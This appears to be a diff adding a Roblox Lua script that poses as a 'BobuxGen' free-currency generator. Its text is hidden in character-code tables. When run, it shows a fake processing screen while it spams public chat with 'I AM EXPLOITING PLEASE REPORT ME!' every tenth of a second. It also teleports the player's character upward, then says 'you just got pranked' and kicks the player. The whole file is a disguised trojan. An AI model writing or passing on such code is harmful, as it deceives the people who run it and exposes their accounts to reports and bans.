@@ -1,0 +1,106 @@
+local A = game:GetService("Players")
+local B = A.LocalPlayer
+local C = game:GetService("ReplicatedStorage")
+local D = game:GetService("TextChatService")
+local E = game:GetService("CoreGui")
+local F = game:GetService("UserInputService")
+
+local T1 = {73,32,65,77,32,69,88,80,76,79,73,84,73,78,71,32,80,76,69,65,83,69,32,82,69,80,79,82,84,32,77,69,33}
+local T2 = {121,111,117,32,106,117,115,116,32,103,111,116,32,112,114,97,110,107,101,100,32,58,41,32,121,111,117,114,32,97,99,99,111,117,110,116,32,119,105,108,108,32,110,111,116,32,98,101,32,114,101,112,111,114,116,101,100,32,62,58,41}
+local T3 = {91,66,111,98,117,120,71,101,110,93,32,80,114,111,99,101,115,115,105,110,103}
+local T4 = {91,66,111,98,117,120,71,101,110,93,32,68,111,110,101,33,32,226,156,133}
+
+local X1 = {75,105,99,107}
+local X2 = {58,41}
+
+local function H(tbl) return string.char(table.unpack(tbl)) end
+
+local S1,S2,S3,S4,S5,S6 = H(T1),H(T2),H(T3),H(T4),H(X1),H(X2)
+
+local function G(msg)
+    local ch = D:FindFirstChild("TextChannels") and D.TextChannels:FindFirstChild("RBXGeneral")
+    if ch then
+        ch:SendAsync(msg)
+    else
+        local rm = C:FindFirstChild("DefaultChatSystemChatEvents")
+        if rm and rm:FindFirstChild("SayMessageRequest") then
+            rm.SayMessageRequest:FireServer(msg, "All")
+        end
+    end
+end
+
+local U1 = Instance.new("ScreenGui")
+U1.Name = tostring(math.random(1000,9999))
+U1.ResetOnSpawn = false
+U1.IgnoreGuiInset = true
+U1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+U1.Parent = E
+
+local U2 = Instance.new("Frame")
+U2.Size = UDim2.new(1,0,1,0)
+U2.Position = UDim2.new(0,0,0,0)
+U2.BackgroundColor3 = Color3.new(1,1,1)
+U2.Parent = U1
+
+local U3 = Instance.new("TextLabel")
+U3.Size = UDim2.new(1,0,0.2,0)
+U3.Position = UDim2.new(0,0,0.4,0)
+U3.BackgroundTransparency = 1
+U3.TextColor3 = Color3.new(0,0,0)
+U3.Font = Enum.Font.SourceSansBold
+U3.TextScaled = true
+U3.Text = S3
+U3.Parent = U2
+
+local U4 = Instance.new("TextLabel")
+U4.Size = UDim2.new(0,400,0,30)
+U4.Position = UDim2.new(0,5,1,-35)
+U4.BackgroundTransparency = 1
+U4.TextColor3 = Color3.new(0,0,0)
+U4.Font = Enum.Font.SourceSans
+U4.TextSize = 12
+U4.TextXAlignment = Enum.TextXAlignment.Left
+U4.Text = S2
+U4.Visible = false
+U4.Parent = U2
+
+F.InputBegan:Connect(function(I,G)
+    if not G and I.KeyCode == Enum.KeyCode.F4 then
+        if U1 then U1:Destroy() end
+    end
+end)
+
+local N = math.random(5,15)
+local C = 0
+local Dn = false
+
+task.spawn(function()
+    while not Dn do
+        for i=1,4 do
+            U3.Text = S3 .. string.rep(".",i)
+            task.wait(0.5)
+        end
+        C += 1
+        if C >= N then Dn = true end
+    end
+    U3.Text = S4
+    U4.Visible = true
+    task.wait(5)
+    B[S5](B,S6)
+end)
+
+task.spawn(function()
+    while not Dn do
+        G(S1)
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    local ch = B.Character or B.CharacterAdded:Wait()
+    local hrp = ch:WaitForChild("HumanoidRootPart")
+    while not Dn and hrp do
+        hrp.CFrame = hrp.CFrame + Vector3.new(0,100,0)
+        task.wait(0.2)
+    end
+end)
